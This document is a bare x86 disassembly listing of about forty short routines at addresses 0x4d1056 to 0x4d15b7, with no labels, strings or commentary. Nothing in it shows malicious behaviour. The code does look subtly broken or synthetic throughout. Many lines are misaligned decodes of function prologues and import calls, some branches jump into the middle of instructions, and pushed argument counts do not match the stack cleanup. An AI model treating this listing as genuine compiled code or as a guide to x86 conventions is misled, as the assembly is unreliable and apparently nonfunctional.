  4d1056:	adc    eax,0x4d2058
  4d105b:	call   edi
  4d105d:	add    BYTE PTR [eax],al
  4d105f:	add    BYTE PTR [edi-0x1],bl
  4d1062:	adc    eax,0x4d2004
  4d1067:	call   edi
  4d1069:	add    BYTE PTR [eax],al
  4d106b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1071:	sub    esp,0x2c
  4d1074:	lea    edi,[ecx-0x14]
  4d1077:	mov    ecx,0x6f02
  4d107c:	push   edi
  4d107d:	push   DWORD PTR [edi+0x24]
  4d1080:	push   DWORD PTR [edi+0xf0]
  4d1086:	push   DWORD PTR [edi+0xc8]
  4d108c:	push   ebx
  4d108d:	call   0x4d08c8
  4d1092:	add    esp,0x10
  4d1095:	pop    edi
  4d1096:	push   edi
  4d1097:	push   0x0
  4d1099:	call   0x4d1048
  4d109e:	add    esp,0x4
  4d10a1:	pop    edi
  4d10a2:	push   edi
  4d10a3:	push   0x0
  4d10a5:	call   0x4d0e70
  4d10aa:	add    esp,0x4
  4d10ad:	pop    edi
  4d10ae:	add    esp,0x2c
  4d10b1:	pop    ebp
  4d10b2:	ret    
  4d10b3:	add    BYTE PTR [edi-0x1],bl
  4d10b6:	adc    eax,0x4d2030
  4d10bb:	call   edi
  4d10bd:	add    BYTE PTR [eax],al
  4d10bf:	add    BYTE PTR [edi-0x1],bl
  4d10c2:	adc    eax,0x4d2094
  4d10c7:	call   edi
  4d10c9:	add    BYTE PTR [eax],al
  4d10cb:	add    BYTE PTR [edi-0x1],bl
  4d10ce:	adc    eax,0x4d2018
  4d10d3:	call   edi
  4d10d5:	add    BYTE PTR [eax],al
  4d10d7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d10dd:	sub    esp,0x60
  4d10e0:	lea    ebx,[eax+0x20]
  4d10e3:	or     DWORD PTR [ebp-0x50],ebx
  4d10e6:	push   ebx
  4d10e7:	push   ecx
  4d10e8:	push   DWORD PTR [ebx+0x110]
  4d10ee:	push   eax
  4d10ef:	call   0x4d0be8
  4d10f4:	add    esp,0xc
  4d10f7:	pop    ebx
  4d10f8:	push   0x0
  4d10fa:	call   0x4d0c44
  4d10ff:	add    esp,0x4
  4d1102:	mov    esi,0x0
  4d1107:	push   esi
  4d1108:	call   0x4d10b4
  4d110d:	add    esp,0x4
  4d1110:	add    esp,0x60
  4d1113:	pop    ebp
  4d1114:	ret    
  4d1115:	add    BYTE PTR [eax],al
  4d1117:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d111d:	sub    esp,0x20
  4d1120:	lea    esi,[edi+0xbc]
  4d1126:	add    DWORD PTR [ebp-0x10],0xffffff9a
  4d112a:	call   0x4d12b0
  4d112f:	add    esp,0x4
  4d1132:	push   esi
  4d1133:	push   ebx
  4d1134:	push   ebx
  4d1135:	push   DWORD PTR [esi+0x7c]
  4d1138:	push   ecx
  4d1139:	call   0x4d1368
  4d113e:	add    esp,0x10
  4d1141:	pop    esi
  4d1142:	call   0x4d0bd0
  4d1147:	add    esp,0x4
  4d114a:	add    esp,0x20
  4d114d:	pop    ebp
  4d114e:	ret    
  4d114f:	add    BYTE PTR [edi-0x1],bl
  4d1152:	adc    eax,0x4d2074
  4d1157:	call   edi
  4d1159:	add    BYTE PTR [eax],al
  4d115b:	add    BYTE PTR [edi-0x1],bl
  4d115e:	adc    eax,0x4d204c
  4d1163:	call   edi
  4d1165:	add    BYTE PTR [eax],al
  4d1167:	add    BYTE PTR [edi-0x1],bl
  4d116a:	adc    eax,0x4d2088
  4d116f:	call   edi
  4d1171:	add    BYTE PTR [eax],al
  4d1173:	add    BYTE PTR [edi-0x1],bl
  4d1176:	adc    eax,0x4d2040
  4d117b:	call   edi
  4d117d:	add    BYTE PTR [eax],al
  4d117f:	add    BYTE PTR [edi-0x1],bl
  4d1182:	adc    eax,0x4d2080
  4d1187:	call   edi
  4d1189:	add    BYTE PTR [eax],al
  4d118b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1191:	sub    esp,0x54
  4d1194:	mov    ebx,0x4d300c
  4d1199:	cmp    ebx,0x334c
  4d119f:	jbe    0x4d118f
  4d11a1:	push   ebx
  4d11a2:	push   ecx
  4d11a3:	push   DWORD PTR [ebx+0x60]
  4d11a6:	push   DWORD PTR [ebx+0x1e8]
  4d11ac:	push   edx
  4d11ad:	call   0x4d1318
  4d11b2:	add    esp,0x10
  4d11b5:	pop    ebx
  4d11b6:	mov    esi,0x0
  4d11bb:	push   esi
  4d11bc:	call   0x4d1060
  4d11c1:	add    esp,0x4
  4d11c4:	push   0x0
  4d11c6:	call   0x4d0fec
  4d11cb:	add    esp,0x4
  4d11ce:	add    esp,0x54
  4d11d1:	pop    ebp
  4d11d2:	ret    
  4d11d3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d11d9:	sub    esp,0x54
  4d11dc:	lea    ebx,[eax+0x78]
  4d11df:	and    edi,DWORD PTR [ebp-0x10]
  4d11e2:	push   0x0
  4d11e4:	call   0x4d10b4
  4d11e9:	add    esp,0x4
  4d11ec:	push   ebx
  4d11ed:	push   DWORD PTR [ebx+0x17c]
  4d11f3:	push   eax
  4d11f4:	push   ecx
  4d11f5:	push   edi
  4d11f6:	call   0x4d1400
  4d11fb:	add    esp,0x10
  4d11fe:	pop    ebx
  4d11ff:	call   0x4d0bd0
  4d1204:	add    esp,0x4
  4d1207:	add    esp,0x54
  4d120a:	pop    ebp
  4d120b:	ret    
  4d120c:	mov    edi,edi
  4d120e:	push   ebp
  4d120f:	mov    ebp,esp
  4d1211:	sub    esp,0x3c
  4d1214:	lea    ecx,[edi-0x120]
  4d121a:	cmp    ecx,0x1069
  4d1220:	je     0x4d120f
  4d1222:	push   ecx
  4d1223:	push   eax
  4d1224:	push   DWORD PTR [ecx+0x58]
  4d1227:	push   ebx
  4d1228:	push   DWORD PTR [ecx]
  4d122a:	call   0x4d07dc
  4d122f:	add    esp,0x10
  4d1232:	pop    ecx
  4d1233:	push   ecx
  4d1234:	call   0x4d115c
  4d1239:	add    esp,0x4
  4d123c:	pop    ecx
  4d123d:	push   ecx
  4d123e:	mov    eax,0x0
  4d1243:	push   eax
  4d1244:	call   0x4d0fe0
  4d1249:	add    esp,0x4
  4d124c:	pop    ecx
  4d124d:	add    esp,0x3c
  4d1250:	pop    ebp
  4d1251:	ret    
  4d1252:	add    BYTE PTR [eax],al
  4d1254:	pop    edi
  4d1255:	call   DWORD PTR ds:0x4d2008
  4d125b:	call   edi
  4d125d:	add    BYTE PTR [eax],al
  4d125f:	add    BYTE PTR [edi-0x1],bl
  4d1262:	adc    eax,0x4d200c
  4d1267:	call   edi
  4d1269:	add    BYTE PTR [eax],al
  4d126b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1271:	sub    esp,0x24
  4d1274:	mov    ebx,0x4d310c
  4d1279:	add    edi,DWORD PTR [ebp-0x20]
  4d127c:	push   ebx
  4d127d:	push   DWORD PTR [ebx+0x64]
  4d1280:	push   edx
  4d1281:	push   DWORD PTR [ebx+0x110]
  4d1287:	call   0x4d1444
  4d128c:	add    esp,0xc
  4d128f:	pop    ebx
  4d1290:	mov    eax,0x0
  4d1295:	push   eax
  4d1296:	call   0x4d1174
  4d129b:	add    esp,0x4
  4d129e:	push   0x0
  4d12a0:	call   0x4d0c44
  4d12a5:	add    esp,0x4
  4d12a8:	add    esp,0x24
  4d12ab:	pop    ebp
  4d12ac:	ret    
  4d12ad:	add    BYTE PTR [eax],al
  4d12af:	add    BYTE PTR [edi-0x1],bl
  4d12b2:	adc    eax,0x4d203c
  4d12b7:	call   edi
  4d12b9:	add    BYTE PTR [eax],al
  4d12bb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d12c1:	sub    esp,0x1c
  4d12c4:	lea    edi,[ecx-0xc8]
  4d12ca:	cmp    edi,0x534
  4d12d0:	je     0x4d12bf
  4d12d2:	push   edi
  4d12d3:	push   eax
  4d12d4:	push   DWORD PTR [edi+0x14]
  4d12d7:	push   DWORD PTR [edi+0xcc]
  4d12dd:	push   DWORD PTR [edi+0xf4]
  4d12e3:	call   0x4d0b50
  4d12e8:	add    esp,0x10
  4d12eb:	pop    edi
  4d12ec:	push   edi
  4d12ed:	call   0x4d12b0
  4d12f2:	add    esp,0x4
  4d12f5:	pop    edi
  4d12f6:	push   edi
  4d12f7:	mov    ebx,0x0
  4d12fc:	push   ebx
  4d12fd:	call   0x4d1260
  4d1302:	add    esp,0x4
  4d1305:	pop    edi
  4d1306:	add    esp,0x1c
  4d1309:	pop    ebp
  4d130a:	ret    
  4d130b:	add    BYTE PTR [edi-0x1],bl
  4d130e:	adc    eax,0x4d2044
  4d1313:	call   edi
  4d1315:	add    BYTE PTR [eax],al
  4d1317:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d131d:	sub    esp,0x30
  4d1320:	lea    edx,[ebx+0x110]
  4d1326:	sbb    esi,DWORD PTR [edx+0x80]
  4d132c:	push   edx
  4d132d:	push   0x0
  4d132f:	call   0x4d0c44
  4d1334:	add    esp,0x4
  4d1337:	pop    edx
  4d1338:	push   edx
  4d1339:	push   ebx
  4d133a:	push   ebx
  4d133b:	push   DWORD PTR [edx+0x1ec]
  4d1341:	call   0x4d0f34
  4d1346:	add    esp,0xc
  4d1349:	pop    edx
  4d134a:	push   edx
  4d134b:	push   0x0
  4d134d:	call   0x4d10b4
  4d1352:	add    esp,0x4
  4d1355:	pop    edx
  4d1356:	add    esp,0x30
  4d1359:	pop    ebp
  4d135a:	ret    
  4d135b:	add    BYTE PTR [edi-0x1],bl
  4d135e:	adc    eax,0x4d2014
  4d1363:	call   edi
  4d1365:	add    BYTE PTR [eax],al
  4d1367:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d136d:	sub    esp,0x1c
  4d1370:	lea    eax,[esi+0x2c]
  4d1373:	and    ebx,DWORD PTR [ebp-0x14]
  4d1376:	push   eax
  4d1377:	push   DWORD PTR [eax+0x54]
  4d137a:	push   DWORD PTR [eax+0x88]
  4d1380:	push   DWORD PTR [eax+0x110]
  4d1386:	push   DWORD PTR [eax+0x148]
  4d138c:	call   0x4d126c
  4d1391:	add    esp,0x10
  4d1394:	pop    eax
  4d1395:	push   eax
  4d1396:	call   0x4d0bd0
  4d139b:	add    esp,0x4
  4d139e:	pop    eax
  4d139f:	push   eax
  4d13a0:	mov    ebx,0x0
  4d13a5:	push   ebx
  4d13a6:	call   0x4d1060
  4d13ab:	add    esp,0x4
  4d13ae:	pop    eax
  4d13af:	add    esp,0x1c
  4d13b2:	pop    ebp
  4d13b3:	ret    
  4d13b4:	mov    edi,edi
  4d13b6:	push   ebp
  4d13b7:	mov    ebp,esp
  4d13b9:	sub    esp,0x50
  4d13bc:	lea    ecx,ds:0x4d3188
  4d13c2:	sbb    edi,ebx
  4d13c4:	push   ecx
  4d13c5:	push   0x0
  4d13c7:	call   0x4d1260
  4d13cc:	add    esp,0x4
  4d13cf:	pop    ecx
  4d13d0:	push   ecx
  4d13d1:	push   eax
  4d13d2:	push   edx
  4d13d3:	push   DWORD PTR [ecx+0x178]
  4d13d9:	push   DWORD PTR [ecx+0x17c]
  4d13df:	call   0x4d12bc
  4d13e4:	add    esp,0x10
  4d13e7:	pop    ecx
  4d13e8:	push   ecx
  4d13e9:	mov    edi,0xfffffff4
  4d13ee:	push   edi
  4d13ef:	call   0x4d10cc
  4d13f4:	add    esp,0x4
  4d13f7:	pop    ecx
  4d13f8:	add    esp,0x50
  4d13fb:	pop    ebp
  4d13fc:	ret    
  4d13fd:	add    BYTE PTR [eax],al
  4d13ff:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1405:	sub    esp,0x58
  4d1408:	mov    esi,0x4d310c
  4d140d:	mov    eax,0x79
  4d1412:	mov    ecx,0x0
  4d1417:	push   ecx
  4d1418:	call   0x4d0a38
  4d141d:	add    esp,0x4
  4d1420:	push   esi
  4d1421:	push   edx
  4d1422:	push   DWORD PTR [esi+0x1ec]
  4d1428:	push   DWORD PTR [esi+0xe0]
  4d142e:	call   0x4d0ff8
  4d1433:	add    esp,0xc
  4d1436:	pop    esi
  4d1437:	call   0x4d0bd0
  4d143c:	add    esp,0x4
  4d143f:	add    esp,0x58
  4d1442:	pop    ebp
  4d1443:	ret    
  4d1444:	mov    edi,edi
  4d1446:	push   ebp
  4d1447:	mov    ebp,esp
  4d1449:	sub    esp,0x44
  4d144c:	lea    edi,[ebx+0xf0]
  4d1452:	sbb    DWORD PTR [edi-0xc8],0x5146
  4d145c:	push   edi
  4d145d:	push   DWORD PTR [edi+0x10c]
  4d1463:	push   DWORD PTR [edi+0xa8]
  4d1469:	push   DWORD PTR [edi+0x90]
  4d146f:	call   0x4d120c
  4d1474:	add    esp,0xc
  4d1477:	pop    edi
  4d1478:	push   edi
  4d1479:	push   0x0
  4d147b:	call   0x4d0a38
  4d1480:	add    esp,0x4
  4d1483:	pop    edi
  4d1484:	push   edi
  4d1485:	call   0x4d115c
  4d148a:	add    esp,0x4
  4d148d:	pop    edi
  4d148e:	add    esp,0x44
  4d1491:	pop    ebp
  4d1492:	ret    
  4d1493:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1499:	sub    esp,0x5c
  4d149c:	lea    ecx,[eax-0x38]
  4d149f:	add    edi,DWORD PTR [ecx+0x160]
  4d14a5:	push   ecx
  4d14a6:	mov    ebx,0x0
  4d14ab:	push   ebx
  4d14ac:	call   0x4d10b4
  4d14b1:	add    esp,0x4
  4d14b4:	pop    ecx
  4d14b5:	push   ecx
  4d14b6:	push   ebx
  4d14b7:	push   DWORD PTR [ecx+0x194]
  4d14bd:	push   edi
  4d14be:	push   DWORD PTR [ecx+0x50]
  4d14c1:	call   0x4d0e30
  4d14c6:	add    esp,0x10
  4d14c9:	pop    ecx
  4d14ca:	push   ecx
  4d14cb:	mov    ecx,0x0
  4d14d0:	push   ecx
  4d14d1:	call   0x4d0c44
  4d14d6:	add    esp,0x4
  4d14d9:	pop    ecx
  4d14da:	add    esp,0x5c
  4d14dd:	pop    ebp
  4d14de:	ret    
  4d14df:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d14e5:	sub    esp,0x24
  4d14e8:	lea    esi,ds:0x4d30f8
  4d14ee:	and    DWORD PTR [esi+0xbc],edx
  4d14f4:	push   0x0
  4d14f6:	call   0x4d0c44
  4d14fb:	add    esp,0x4
  4d14fe:	push   esi
  4d14ff:	push   DWORD PTR [esi+0x9c]
  4d1505:	push   ebx
  4d1506:	push   ecx
  4d1507:	call   0x4d0c50
  4d150c:	add    esp,0xc
  4d150f:	pop    esi
  4d1510:	mov    edi,0x0
  4d1515:	push   edi
  4d1516:	call   0x4d0a38
  4d151b:	add    esp,0x4
  4d151e:	add    esp,0x24
  4d1521:	pop    ebp
  4d1522:	ret    
  4d1523:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1529:	sub    esp,0x3c
  4d152c:	lea    esi,ds:0x4d31b4
  4d1532:	adc    edi,DWORD PTR [esi-0x148]
  4d1538:	mov    ebx,0x0
  4d153d:	push   ebx
  4d153e:	call   0x4d10b4
  4d1543:	add    esp,0x4
  4d1546:	push   esi
  4d1547:	push   DWORD PTR [esi+0xc4]
  4d154d:	push   DWORD PTR [esi+0x174]
  4d1553:	push   ebx
  4d1554:	push   edi
  4d1555:	call   0x4d09a8
  4d155a:	add    esp,0x10
  4d155d:	pop    esi
  4d155e:	call   0x4d0bd0
  4d1563:	add    esp,0x4
  4d1566:	add    esp,0x3c
  4d1569:	pop    ebp
  4d156a:	ret    
  4d156b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1571:	sub    esp,0x3c
  4d1574:	lea    eax,ds:0x4d3008
  4d157a:	mov    edx,DWORD PTR [eax+0x158]
  4d1580:	push   eax
  4d1581:	push   DWORD PTR [eax+0x10]
  4d1584:	push   DWORD PTR [eax+0x28]
  4d1587:	push   DWORD PTR [eax+0x6c]
  4d158a:	push   DWORD PTR [eax+0x1c8]
  4d1590:	call   0x4d0b8c
  4d1595:	add    esp,0x10
  4d1598:	pop    eax
  4d1599:	push   eax
  4d159a:	call   0x4d0bd0
  4d159f:	add    esp,0x4
  4d15a2:	pop    eax
  4d15a3:	push   eax
  4d15a4:	mov    ecx,0x0
  4d15a9:	push   ecx
  4d15aa:	call   0x4d1174
  4d15af:	add    esp,0x4
  4d15b2:	pop    eax
  4d15b3:	add    esp,0x3c
  4d15b6:	pop    ebp
  4d15b7:	ret    
